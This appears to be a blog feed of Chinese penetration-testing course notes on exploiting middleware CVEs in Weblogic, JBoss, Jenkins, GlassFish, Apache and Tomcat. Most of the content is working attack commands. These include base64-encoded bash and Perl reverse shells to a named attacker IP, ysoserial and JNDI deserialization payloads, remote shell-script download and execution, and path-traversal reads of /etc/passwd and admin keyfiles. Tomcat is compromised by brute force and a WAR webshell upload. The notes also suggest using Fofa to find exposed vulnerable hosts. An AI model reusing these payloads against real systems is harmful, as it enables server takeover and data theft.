<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ai潼</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-03-12T03:11:28.936Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>pwy</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Day61 服务攻防-中间件安全&amp;CVE复现&amp;K8s&amp;Docker&amp;Jetty&amp;Websphere</title>
    <link href="http://example.com/2023/03/12/Day61-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-K8s-Docker-Jetty-Websphere/"/>
    <id>http://example.com/2023/03/12/Day61-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-K8s-Docker-Jetty-Websphere/</id>
    <published>2023-03-12T03:08:36.000Z</published>
    <updated>2023-03-12T03:11:28.936Z</updated>
    
    
    
    
    <category term="服务攻防" scheme="http://example.com/categories/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>Day60 服务攻防-中间件安全&amp;CVE复现&amp;Weblogic&amp;Jenkins&amp;GlassFish</title>
    <link href="http://example.com/2023/03/12/Day60-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Weblogic-Jenkins-GlassFish/"/>
    <id>http://example.com/2023/03/12/Day60-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Weblogic-Jenkins-GlassFish/</id>
    <published>2023-03-12T03:08:13.000Z</published>
    <updated>2023-03-12T13:41:57.551Z</updated>
    
    <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>中间件及框架列表：</p><p>IIS，Apache，Nginx，Tomcat，Docker，Weblogic，JBoos，WebSphere，Jenkins ，GlassFish，Jira，Struts2，Laravel，Solr，Shiro，Thinkphp，Spring，Flask，jQuery等</p><p>1、中间件-Weblogic安全</p><p>2、中间件-JBoos安全</p><p>2、中间件-Jenkins安全</p><p>3、中间件-GlassFish安全</p><h3 id="章节内容："><a href="#章节内容：" class="headerlink" title="#章节内容："></a>#章节内容：</h3><p>常见中间件的安全测试：</p><p>1、配置不当-解析&amp;弱口令</p><p>2、安全机制-特定安全漏洞</p><p>3、安全机制-弱口令爆破攻击</p><p>4、安全应用-框架特定安全漏洞</p><h3 id="前置知识："><a href="#前置知识：" class="headerlink" title="#前置知识："></a>#前置知识：</h3><p>中间件安全测试流程：</p><p>1、判断中间件信息-名称&amp;版本&amp;三方</p><p>2、判断中间件问题-配置不当&amp;公开漏洞</p><p>3、判断中间件利用-弱口令&amp;EXP&amp;框架漏洞</p><h3 id="应用服务安全测试流程：见图"><a href="#应用服务安全测试流程：见图" class="headerlink" title="应用服务安全测试流程：见图"></a>应用服务安全测试流程：见图</h3><p>1、判断服务开放情况-端口扫描&amp;组合应用等</p><p>2、判断服务类型归属-数据库&amp;文件传输&amp;通讯等</p><p>3、判断服务利用方式-特定漏洞&amp;未授权&amp;弱口令等</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ 中间件-Weblogic-工具搜哈</p><p>➢ 中间件-JBoos-工具脚本搜哈</p><p>➢ 中间件-Jenkins-工具脚本搜哈</p><p>➢ 中间件-GlassFish-工具脚本搜哈</p><p>➢ 配合下-FofaViewer-工具脚本搜哈</p><h4 id="中间件-Weblogic-工具搜哈"><a href="#中间件-Weblogic-工具搜哈" class="headerlink" title="#中间件-Weblogic-工具搜哈"></a>#中间件-Weblogic-工具搜哈</h4><p>探针默认端口：7001，Weblogic是Oracle公司推出的J2EE应用服务器</p><p>cve_2017_3506   工具</p><p>cve_2018_2893   工具</p><p>cve_2018_3245   工具</p><p>cve_2020_14882  工具</p><blockquote><p>cve_2021_2394   反序列化（手工）</p><p><a href="https://github.com/lz2y/CVE-2021-2394">https://github.com/lz2y/CVE-2021-2394</a></p><p><a href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></p><p>vps生成ldap 监听端口</p><p>编码：bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.94.236.117&#x2F;5566 0&gt;&amp;1</p><p>执行：java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C “bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC4yMzYuMTE3LzU1NjYgMD4mMQ&#x3D;&#x3D;}|{base64,-d}|{bash,-i}” -A 47.94.236.117</p><p>发送数据触发</p><p>java -jar CVE_2021_2394.jar 123.58.236.76 32185 ldap:&#x2F;&#x2F;47.94.236.117:1389&#x2F;x1nfdy</p></blockquote><h4 id="中间件-JBoos-工具脚本搜哈"><a href="#中间件-JBoos-工具脚本搜哈" class="headerlink" title="#中间件-JBoos-工具脚本搜哈"></a>#中间件-JBoos-工具脚本搜哈</h4><p>Jboss通常占用的端口是1098，1099，4444，4445，8080，8009，8083，8093这几个，Red Hat JBoss Application Server 是一款基于JavaEE的开源应用服务器。</p><h6 id="1、CVE-2017-12149"><a href="#1、CVE-2017-12149" class="headerlink" title="1、CVE-2017-12149"></a>1、CVE-2017-12149</h6><p>复现链接：<a href="https://blog.csdn.net/Jerry____/article/details/103506224">(20条消息) CVE-2017-12149（JBOSS反序列化远程代码执行漏洞）漏洞复现_Jerry____的博客-CSDN博客</a></p><blockquote><p>java -jar ysoserial-master-30099844c6-1.jar CommonsCollections5 “bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC4yMzYuMTE3LzU1NjYgMD4mMQ&#x3D;&#x3D;}|{base64,-d}|{bash,-i}” &gt; poc.ser</p><p>curl <a href="http://47.94.236.117:8080/invoker/readonly">http://47.94.236.117:8080/invoker/readonly</a> –data-binary @poc.ser</p></blockquote><h6 id="2、CVE-2017-7504"><a href="#2、CVE-2017-7504" class="headerlink" title="2、CVE-2017-7504"></a>2、CVE-2017-7504</h6><p>复现链接：<a href="https://blog.csdn.net/weixin_42936566/article/details/86772045">(20条消息) 【Vulhub】CVE-2017-7504 JBOSS反序列化漏洞复现_看不尽的尘埃的博客-CSDN博客</a></p><blockquote><p>java -jar ysoserial-master-30099844c6-1.jar CommonsCollections5 “bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC4yMzYuMTE3LzU1NjYgMD4mMQ&#x3D;&#x3D;}|{base64,-d}|{bash,-i}” &gt; 1.ser</p><p>curl <a href="http://47.94.236.117:8080/jbossmq-httpil/HTTPServerILServlet">http://47.94.236.117:8080/jbossmq-httpil/HTTPServerILServlet</a> –data-binary @1.ser</p></blockquote><h6 id="3、弱口令-未授权访问见手册"><a href="#3、弱口令-未授权访问见手册" class="headerlink" title="3、弱口令 未授权访问见手册"></a>3、弱口令 未授权访问见手册</h6><h4 id="中间件-Jenkins-工具脚本搜哈"><a href="#中间件-Jenkins-工具脚本搜哈" class="headerlink" title="#中间件-Jenkins-工具脚本搜哈"></a>#中间件-Jenkins-工具脚本搜哈</h4><p>探针默认端口：8080，Jenkins是一个开源软件项目，是基于Java开发的一种持续集成工具，用于监控持续重复的工作。</p><h6 id="1、cve-2017-1000353-JDK-1-8-0-291-其他版本失效"><a href="#1、cve-2017-1000353-JDK-1-8-0-291-其他版本失效" class="headerlink" title="1、cve_2017_1000353 JDK-1.8.0_291 其他版本失效"></a>1、cve_2017_1000353 <strong>JDK-1.8.0_291 其他版本失效</strong></h6><p>复现链接：<a href="https://blog.csdn.net/YouthBelief/article/details/121528843">(20条消息) Jenkins 远程代码执行漏洞（CVE-2017-1000353） 复现_jenkins漏洞_YouthBelief的博客-CSDN博客</a></p><p><a href="http://github.com/vulhub/CVE-2017-1000353">http://github.com/vulhub/CVE-2017-1000353</a></p><blockquote><p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.94.236.117&#x2F;5566 0&gt;&amp;1</p><p>java -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar jenkins_poc.ser “bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC4yMzYuMTE3LzU1NjYgMD4mMQ&#x3D;&#x3D;}|{base64,-d}|{bash,-i}”</p><p>python exploit.py <a href="http://123.58.236.76:54217/">http://123.58.236.76:54217</a> jenkins_poc.ser</p></blockquote><h6 id="2、CVE-2018-1000861"><a href="#2、CVE-2018-1000861" class="headerlink" title="2、CVE-2018-1000861"></a>2、CVE-2018-1000861</h6><p>复现链接：<a href="https://blog.csdn.net/weixin_43486390/article/details/111495455">(20条消息) 【漏洞复现】Jenkins远程命令执行漏洞（CVE-2018-1000861）_cve-2018-1000861复现_ps_x的博客-CSDN博客</a></p><p><a href="https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc">https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc</a></p><blockquote><p>此处未知原因无法执行脚本无效，所有让其远程下载shell.txt再本地执行1.sh让其远程执行shell.txt的内容</p><p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;47.94.236.117&#x2F;5566 0&gt;&amp;1（shell.txt）</p><p>python3 -m http.server 8888</p><p>python2 exp.py <a href="http://123.58.236.76:52281/">http://123.58.236.76:52281/</a> “curl -o &#x2F;tmp&#x2F;1.sh <a href="http://47.94.236.117:8888/shell.txt">http://47.94.236.117:8888/shell.txt</a>“</p><p>python2 exp.py <a href="http://123.58.236.76:52281/">http://123.58.236.76:52281/</a> “bash &#x2F;tmp&#x2F;1.sh”</p></blockquote><h6 id="3、cve-2019-100300-需要用户帐号密码，条件苛刻"><a href="#3、cve-2019-100300-需要用户帐号密码，条件苛刻" class="headerlink" title="3、cve_2019_100300 需要用户帐号密码，条件苛刻"></a>3、cve_2019_100300 需要用户帐号密码，条件苛刻</h6><h4 id="中间件-GlassFish-工具脚本搜哈"><a href="#中间件-GlassFish-工具脚本搜哈" class="headerlink" title="#中间件-GlassFish-工具脚本搜哈"></a>#中间件-GlassFish-工具脚本搜哈</h4><p>探针默认端口：4848，GlassFish 是一款强健的商业兼容应用服务器</p><h6 id="1、CVE-2017-1000028"><a href="#1、CVE-2017-1000028" class="headerlink" title="1、CVE-2017-1000028"></a>1、CVE-2017-1000028</h6><blockquote><p>读密码：&#x2F;theme&#x2F;META-INF&#x2F;%c0.%c0.&#x2F;%c0.%c0.&#x2F;%c0.%c0.&#x2F;%c0.%c0.&#x2F;%c0.%c0.&#x2F;domains&#x2F;domain1&#x2F;config&#x2F;admin-keyfile</p><p>读windows文件：&#x2F;theme &#x2F;META-INF&#x2F;prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows&#x2F;win.ini</p><p>读linux文件：&#x2F;theme&#x2F;META-INF&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;etc&#x2F;passwd</p></blockquote><h6 id="2、简单口令"><a href="#2、简单口令" class="headerlink" title="2、简单口令"></a>2、简单口令</h6><h4 id="配合下-Fofa-Viewer-工具脚本搜哈"><a href="#配合下-Fofa-Viewer-工具脚本搜哈" class="headerlink" title="#配合下-Fofa_Viewer-工具脚本搜哈"></a>#配合下-Fofa_Viewer-工具脚本搜哈</h4><h6 id="1、配合GlassFish读取测试"><a href="#1、配合GlassFish读取测试" class="headerlink" title="1、配合GlassFish读取测试"></a>1、配合GlassFish读取测试</h6><h6 id="2、配合Jenkins-CVE-2018-1000861"><a href="#2、配合Jenkins-CVE-2018-1000861" class="headerlink" title="2、配合Jenkins-CVE-2018-1000861"></a>2、配合Jenkins-CVE-2018-1000861</h6>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;知识点：&quot;&gt;&lt;a href=&quot;#知识点：&quot; class=&quot;headerlink&quot; title=&quot;#知识点：&quot;&gt;&lt;/a&gt;#知识点：&lt;/h3&gt;&lt;p&gt;中间件及框架列表：&lt;/p&gt;
&lt;p&gt;IIS，Apache，Nginx，Tomcat，Docker，Weblogic，JBo</summary>
      
    
    
    
    <category term="服务攻防" scheme="http://example.com/categories/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>Day59 服务攻防-中间件安全&amp;CVE复现&amp;IIS&amp;Apache&amp;Tomcat&amp;Nginx</title>
    <link href="http://example.com/2023/03/12/Day59-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-IIS-Apache-Tomcat-Nginx/"/>
    <id>http://example.com/2023/03/12/Day59-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-IIS-Apache-Tomcat-Nginx/</id>
    <published>2023-03-12T03:07:48.000Z</published>
    <updated>2023-03-12T05:44:14.712Z</updated>
    
    <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>中间件及框架列表：</p><p>IIS，Apache，Nginx，Tomcat，Docker，Weblogic，JBoos，WebSphere，Jenkins ，GlassFish，Jira，Struts2，Laravel，Solr，Shiro，Thinkphp，Spring，Flask，jQuery等</p><p>1、中间件-IIS-短文件&amp;解析&amp;蓝屏等</p><p>2、中间件-Nginx-文件解析&amp;命令执行等</p><p>3、中间件-Apache-RCE&amp;目录遍历&amp;文件解析等</p><p>4、中间件-Tomcat-弱口令&amp;文件上传&amp;文件包含等</p><h3 id="章节内容："><a href="#章节内容：" class="headerlink" title="#章节内容："></a>#章节内容：</h3><p>常见中间件的安全测试：</p><p>1、配置不当-解析&amp;弱口令</p><p>2、安全机制-特定安全漏洞</p><p>3、安全机制-弱口令爆破攻击</p><p>4、安全应用-框架特定安全漏洞</p><h3 id="前置知识："><a href="#前置知识：" class="headerlink" title="#前置知识："></a>#前置知识：</h3><p>中间件安全测试流程：</p><p>1、判断中间件信息-名称&amp;版本&amp;三方</p><p>2、判断中间件问题-配置不当&amp;公开漏洞</p><p>3、判断中间件利用-弱口令&amp;EXP&amp;框架漏洞</p><h3 id="应用服务安全测试流程：见图"><a href="#应用服务安全测试流程：见图" class="headerlink" title="应用服务安全测试流程：见图"></a>应用服务安全测试流程：见图</h3><p>1、判断服务开放情况-端口扫描&amp;组合应用等</p><p>2、判断服务类型归属-数据库&amp;文件传输&amp;通讯等</p><p>3、判断服务利用方式-特定漏洞&amp;未授权&amp;弱口令等</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ 中间件-IIS-短文件&amp;解析&amp;蓝屏等</p><p>➢ 中间件-Nginx-文件解析&amp;命令执行等</p><p>➢ 中间件-Apache-RCE&amp;目录遍历&amp;文件解析等</p><p>➢ 中间件-Tomcat-弱口令&amp;文件上传&amp;文件包含等</p><p> ➢ 中间件-Apache_RCE&amp;Fofa_Viewer-走向高端啊</p><h4 id="中间件-IIS-短文件-amp-解析-amp-蓝屏等"><a href="#中间件-IIS-短文件-amp-解析-amp-蓝屏等" class="headerlink" title="#中间件-IIS-短文件&amp;解析&amp;蓝屏等"></a>#中间件-IIS-短文件&amp;解析&amp;蓝屏等</h4><p>1、短文件：信息收集</p><p>2、文件解析：还有点用</p><p>3、HTTP.SYS：蓝屏崩溃（了解）</p><p>4、CVE-2017-7269 条件过老(了解)</p><h4 id="中间件-Nginx-文件解析-amp-命令执行等"><a href="#中间件-Nginx-文件解析-amp-命令执行等" class="headerlink" title="#中间件-Nginx-文件解析&amp;命令执行等"></a>#中间件-Nginx-文件解析&amp;命令执行等</h4><p>1、后缀解析 文件名解析</p><p>复现链接：(<a href="https://blog.csdn.net/Tauil/article/details/125888127">https://blog.csdn.net/Tauil/article/details/125888127</a>)</p><p>配置不当：该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞。</p><p>CVE-2013-4547：影响版本：Nginx 0.8.41 ~ 1.4.3 &#x2F; 1.5.0 ~ 1.5.7（复现链接：<a href="https://blog.csdn.net/weixin_45744814/article/details/120390057">(20条消息) Nginx文件名逻辑漏洞（CVE-2013-4547）复现_君莫hacker的博客-CSDN博客</a>）</p><p>2、cve_2021_23017 无EXP</p><p>3、cve_2017_7529 意义不大</p><h4 id="中间件-Apache-RCE-amp-目录遍历-amp-文件解析等"><a href="#中间件-Apache-RCE-amp-目录遍历-amp-文件解析等" class="headerlink" title="#中间件-Apache-RCE&amp;目录遍历&amp;文件解析等"></a>#中间件-Apache-RCE&amp;目录遍历&amp;文件解析等</h4><p>Apache HTTP Server是美国阿帕奇（Apache）基金会的一款开源网页服务器。该服务器具有快速、可靠且可通过简单的API进行扩充的特点，发现 Apache HTTP Server 2.4.50 中针对 CVE-2021-41773 的修复不够充分。攻击者可以使用路径遍历攻击将 URL 映射到由类似别名的指令配置的目录之外的文件。如果这些目录之外的文件不受通常的默认配置“要求全部拒绝”的保护，则这些请求可能会成功。如果还为这些别名路径启用了 CGI 脚本，则这可能允许远程代码执行。此问题仅影响 Apache 2.4.49 和 Apache 2.4.50，而不影响更早版本。</p><h6 id="1、cve-2021-42013-RCE"><a href="#1、cve-2021-42013-RCE" class="headerlink" title="1、cve_2021_42013  RCE"></a>1、cve_2021_42013  RCE</h6><p>POST &#x2F;cgi-bin&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;bin&#x2F;sh </p><p>echo;perl -e ‘use Socket;$i&#x3D;”47.94.236.117”;$p&#x3D;5566;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“&#x2F;bin&#x2F;sh -i”);};’</p><p><img src="/../images/Day59-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-IIS-Apache-Tomcat-Nginx/image-20230312121348029.png" alt="image-20230312121348029"></p><p>发送数据包，监听到5566端口</p><p><img src="/../images/Day59-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-IIS-Apache-Tomcat-Nginx/image-20230312121514375.png" alt="image-20230312121514375"></p><h6 id="2、cve-2021-41773-目录穿越"><a href="#2、cve-2021-41773-目录穿越" class="headerlink" title="2、cve_2021_41773 目录穿越"></a>2、cve_2021_41773 目录穿越</h6><p>Apache HTTP Server 2.4.49、2.4.50版本对路径规范化所做的更改中存在一个路径穿越漏洞，攻击者可利用该漏洞读取到Web目录外的其他文件，如系统配置文件、网站源码等，甚至在特定情况下，攻击者可构造恶意请求执行命令，控制服务器。</p><p>Burp：&#x2F;icons&#x2F;.%%32%65&#x2F;%%32%65%%32%65&#x2F;%%32%65%%32%65&#x2F;%%32%65%%32%65&#x2F;etc&#x2F;passwd</p><p><img src="/../images/Day59-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-IIS-Apache-Tomcat-Nginx/image-20230312121738224.png" alt="image-20230312121738224"></p><h6 id="3、cve-2017-15715-文件解析"><a href="#3、cve-2017-15715-文件解析" class="headerlink" title="3、cve-2017-15715  文件解析"></a>3、cve-2017-15715  文件解析</h6><p>Apache HTTPD是一款HTTP服务器。其2.4.0~2.4.29版本存在一个解析漏洞，在解析PHP时，1.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p><p><img src="/../images/Day59-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-IIS-Apache-Tomcat-Nginx/image-20230312125657894.png" alt="image-20230312125657894"></p><p>将此处的空格hex编码20换成0a</p><p><img src="/../images/Day59-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-IIS-Apache-Tomcat-Nginx/image-20230312125747888.png" alt="image-20230312125747888"></p><p>上传成功</p><p><img src="/../images/Day59-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-IIS-Apache-Tomcat-Nginx/image-20230312125812265.png" alt="image-20230312125812265"></p><p>访问1.php%0a</p><p><img src="/../images/Day59-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-IIS-Apache-Tomcat-Nginx/image-20230312125911400.png" alt="image-20230312125911400"></p><h6 id="4、cve-2017-9798-价值不高"><a href="#4、cve-2017-9798-价值不高" class="headerlink" title="4、cve_2017_9798 价值不高"></a>4、cve_2017_9798 价值不高</h6><h6 id="5、cve-2018-11759-价值不高"><a href="#5、cve-2018-11759-价值不高" class="headerlink" title="5、cve_2018_11759 价值不高"></a>5、cve_2018_11759 价值不高</h6><h6 id="6、cve-2021-37580-插件问题"><a href="#6、cve-2021-37580-插件问题" class="headerlink" title="6、cve_2021_37580 插件问题"></a>6、cve_2021_37580 插件问题</h6><h4 id="中间件-Tomcat-弱口令-amp-文件上传-amp-文件包含等"><a href="#中间件-Tomcat-弱口令-amp-文件上传-amp-文件包含等" class="headerlink" title="#中间件-Tomcat-弱口令&amp;文件上传&amp;文件包含等"></a>#中间件-Tomcat-弱口令&amp;文件上传&amp;文件包含等</h4><h6 id="1、弱口令猜解"><a href="#1、弱口令猜解" class="headerlink" title="1、弱口令猜解"></a>1、弱口令猜解</h6><p><a href="https://github.com/BeichenDream/Godzilla">https://github.com/BeichenDream/Godzilla</a></p><p>配置不当导致后台弱口令，可通过上传jsp压缩包改名的war拿shell</p><p>靶场：vulfocus</p><p><img src="/../images/Day59-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-IIS-Apache-Tomcat-Nginx/image-20230312130358355.png" alt="image-20230312130358355"></p><p>抓包爆破</p><p><img src="/../images/Day59-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-IIS-Apache-Tomcat-Nginx/image-20230312130424229.png" alt="image-20230312130424229"></p><p>进入后台</p><p><img src="/../images/Day59-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-IIS-Apache-Tomcat-Nginx/image-20230312130848018.png" alt="image-20230312130848018"></p><p>发现文件上传点，上传的文件必须为war</p><p><img src="/../images/Day59-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-IIS-Apache-Tomcat-Nginx/image-20230312130931060.png" alt="image-20230312130931060"></p><p>将三个木马放进exec文件夹</p><p><img src="/../images/Day59-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-IIS-Apache-Tomcat-Nginx/image-20230312130953913.png" alt="image-20230312130953913"></p><p>将exec文件夹进行压缩为zip格式，手动将后缀zip修改为war</p><p><img src="/../images/Day59-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-IIS-Apache-Tomcat-Nginx/image-20230312131010054.png" alt="image-20230312131010054"></p><p>上传exec.war文件</p><p><img src="/../images/Day59-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-IIS-Apache-Tomcat-Nginx/image-20230312131022283.png" alt="image-20230312131022283"></p><p>上传成功</p><p><img src="/../images/Day59-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-IIS-Apache-Tomcat-Nginx/image-20230312131038744.png" alt="image-20230312131038744"></p><p>可以看到其目录上传成功，用哥斯拉连接原始的jsp文件即可</p><p><img src="/../images/Day59-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-IIS-Apache-Tomcat-Nginx/image-20230312131118349.png" alt="image-20230312131118349"></p><h6 id="2、CVE-2017-12615-文件上传"><a href="#2、CVE-2017-12615-文件上传" class="headerlink" title="2、CVE-2017-12615 文件上传"></a>2、CVE-2017-12615 文件上传</h6><p>复现链接：<a href="https://www.cnblogs.com/confidant/p/15440233.html">Tomcat任意文件写入（CVE-2017-12615）漏洞复现-含POC和EXP - 纸机 - 博客园 (cnblogs.com)</a></p><p>当存在漏洞的Tomcat运行在Windows&#x2F;Linux主机上， 且启用了HTTP PUT请求方法（ 例如， 将readonly初始化参数由默认值设置为false） ， 攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的JSP的webshell文件，JSP文件中的恶意代码将能被服务器执行， 导致服务器上的数据泄露或获取服务器权限。</p><p>影响版本:Apache Tomcat 7.0.0 - 7.0.79</p><p>PUT &#x2F;1.jsp&#x2F; HTTP&#x2F;1.1</p><p>shell代码</p><h6 id="3、cve-2020-1938-文件包含"><a href="#3、cve-2020-1938-文件包含" class="headerlink" title="3、cve_2020_1938 文件包含"></a>3、cve_2020_1938 文件包含</h6><p>复现链接：<a href="https://www.cnblogs.com/twlr/p/12341569.html">CVE-2020-1938 Apache-Tomcat-Ajp漏洞复现 - 终落 - 博客园 (cnblogs.com)</a></p><p>Apache Tomcat AJP协议（默认8009端口）由于存在实现缺陷导致相关参数可控，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp目录下的任意文件。若服务器端同时存在文件上传功能，攻击者可进一步结合文件包含实现远程代码的执行。</p><p>漏洞影响的产品版本包括：</p><p>Tomcat 6.*</p><p>Tomcat 7.* &lt; 7.0.100</p><p>Tomcat 8.* &lt; 8.5.51</p><p>Tomcat 9.* &lt; 9.0.31</p><p>exp:<a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a></p><p>D:\Python27\python.exe CNVD-2020-10487-Tomcat-Ajp-lfi.py 123.58.236.76 -p 63667 -f WEB-INF&#x2F;web.xml</p><h6 id="4、cve-2020-11996-拒绝服务"><a href="#4、cve-2020-11996-拒绝服务" class="headerlink" title="4、cve_2020_11996 拒绝服务"></a>4、cve_2020_11996 拒绝服务</h6><p>危害过大，权限无关，意义不大</p><h6 id="5、cve-2020-9484-反序列化"><a href="#5、cve-2020-9484-反序列化" class="headerlink" title="5、cve_2020_9484 反序列化"></a>5、cve_2020_9484 反序列化</h6><p>利用条件太苛刻，意义不大</p><h4 id="中间件-Fofaviewer-amp-Apache-RCE-走向高端啊"><a href="#中间件-Fofaviewer-amp-Apache-RCE-走向高端啊" class="headerlink" title="#中间件-Fofaviewer&amp;Apache_RCE-走向高端啊"></a>#中间件-Fofaviewer&amp;Apache_RCE-走向高端啊</h4><p>server&#x3D;”Apache&#x2F;2.4.49”</p><blockquote><p>src思路：从资产信息中提取一些中间件的信息，看这些中间件是存在过漏洞，利用已知的漏洞对这些符合特征的进行检测，相当于要<strong>把目标的所有资产信息做一个分离分类</strong>，再针对性的对这些资产进行检测</p><p>如，目标是tomcat,则对其已知的漏洞进行扫描（可用python脚本），如果没有漏洞则先放弃这个点</p><p><img 